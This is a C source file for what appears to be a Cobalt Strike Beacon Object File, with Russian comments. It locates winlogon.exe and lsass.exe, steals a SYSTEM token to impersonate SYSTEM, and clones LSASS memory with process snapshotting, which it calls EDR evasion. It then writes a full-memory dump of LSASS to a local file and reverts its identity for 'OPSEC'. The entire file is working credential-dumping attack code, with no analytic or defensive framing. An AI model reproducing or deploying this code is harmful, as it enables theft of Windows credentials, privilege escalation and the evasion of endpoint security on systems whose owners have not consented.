#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

// --- СТРУКТУРЫ PSS (Process Snapshotting) ---
typedef void* HPSS;
#define PSS_CAPTURE_VA_CLONE 0x00000001
typedef enum { PSS_QUERY_VA_CLONE_INFORMATION = 1 } PSS_QUERY_INFORMATION_CLASS;
typedef struct { HANDLE VaCloneHandle; } PSS_VA_CLONE_INFORMATION;
typedef enum _MINIDUMP_TYPE { MiniDumpWithFullMemory = 0x00000002 } MINIDUMP_TYPE;

// --- СТРОГИЕ ИМПОРТЫ СИСТЕМНЫХ API ---
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssCaptureSnapshot(HANDLE, DWORD, DWORD, HPSS*);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssQuerySnapshot(HPSS, PSS_QUERY_INFORMATION_CLASS, void*, DWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);
DECLSPEC_IMPORT BOOL   WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, void*, void*, void*);

// --- OPSEC HELPER: Сравнение строк без MSVCRT (чтобы не тянуть зависимости) ---
int my_stricmp(const char *a, const char *b) {
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return 1;
        a++; b++;
    }
    return *a != *b;
}

// --- HELPER: Поиск PID по имени процесса ---
DWORD GetPidByName(const char* procName) {
    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;

    if (KERNEL32$Process32First(hSnapshot, &pe32)) {
        do {
            if (my_stricmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe32));
    }
    KERNEL32$CloseHandle(hSnapshot);
    return pid;
}

// --- MAIN BOF ENTRYPOINT ---
void go(char* args, int len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting Autonomous LSASS Dumper (Token Steal + Snapshot)");

    // ШАГ 1: Находим нужные процессы
    DWORD winlogonPid = GetPidByName("winlogon.exe");
    DWORD lsassPid = GetPidByName("lsass.exe");

    if (!winlogonPid || !lsassPid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find winlogon.exe or lsass.exe. Are you admin?");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found Targets -> winlogon: %lu | lsass: %lu", winlogonPid, lsassPid);

    // ШАГ 2: Подготовка к Impersonation (Открываем winlogon.exe)
    HANDLE hWinlogon = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hWinlogon) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess on winlogon failed. Error: %lu", KERNEL32$GetLastError());
        return;
    }

    HANDLE hToken = NULL;
    HANDLE hDuplicateToken = NULL;
    BOOL isImpersonated = FALSE;

    // ШАГ 3: Кража токена SYSTEM
    if (ADVAPI32$OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        if (ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
            if (ADVAPI32$ImpersonateLoggedOnUser(hDuplicateToken)) {
                isImpersonated = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation Successful! Thread is now SYSTEM.");
            }
        }
    }
    
    KERNEL32$CloseHandle(hWinlogon);
    if (hToken) KERNEL32$CloseHandle(hToken);
    if (hDuplicateToken) KERNEL32$CloseHandle(hDuplicateToken);

    if (!isImpersonated) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to impersonate SYSTEM. Error: %lu", KERNEL32$GetLastError());
        return;
    }

    // ========================================================================
    // ЗОНА SYSTEM: Все действия ниже выполняются от имени NT AUTHORITY\SYSTEM
    // ========================================================================

    // ШАГ 4: Открываем LSASS (теперь у нас есть права SYSTEM)
    DWORD dwLsassRights = PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
    HANDLE hLsass = KERNEL32$OpenProcess(dwLsassRights, FALSE, lsassPid);
    
    if (hLsass) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS opened successfully with SYSTEM rights.");
        
        // ШАГ 5: Snapshotting (Уклонение от EDR)
        HPSS hSnapshot = NULL;
        DWORD pssStatus = KERNEL32$PssCaptureSnapshot(hLsass, PSS_CAPTURE_VA_CLONE, 0, &hSnapshot);
        
        if (pssStatus == ERROR_SUCCESS && hSnapshot) {
            PSS_VA_CLONE_INFORMATION cloneInfo = { 0 };
            if (KERNEL32$PssQuerySnapshot(hSnapshot, PSS_QUERY_VA_CLONE_INFORMATION, &cloneInfo, sizeof(cloneInfo)) == ERROR_SUCCESS) {
                
                const char* dumpPath = "lsass_super.dmp";
                HANDLE hFile = KERNEL32$CreateFileA(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                
                if (hFile != INVALID_HANDLE_VALUE) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing Evasion Dump to %s...", dumpPath);
                    
                    // ШАГ 6: Дамп с клона
                    if (DBGHELP$MiniDumpWriteDump(cloneInfo.VaCloneHandle, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! Advanced LSASS dump completed.");
                    } else {
                        BeaconPrintf(CALLBACK_ERROR, "[-] MiniDumpWriteDump failed. Error: %lu", KERNEL32$GetLastError());
                    }
                    KERNEL32$CloseHandle(hFile);
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create dump file. Error: %lu", KERNEL32$GetLastError());
                }
            }
            // Уничтожаем клон
            KERNEL32$PssFreeSnapshot(KERNEL32$GetCurrentProcess(), hSnapshot);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] PssCaptureSnapshot failed. Error: %lu", pssStatus);
        }
        KERNEL32$CloseHandle(hLsass);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess on LSASS failed even as SYSTEM. Error: %lu", KERNEL32$GetLastError());
    }

    // ========================================================================
    // КОНЕЦ ЗОНЫ SYSTEM
    // ========================================================================

    // ШАГ 7: OPSEC Cleanup
    ADVAPI32$RevertToSelf();
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reverted to original Admin identity. OPSEC clean.");
}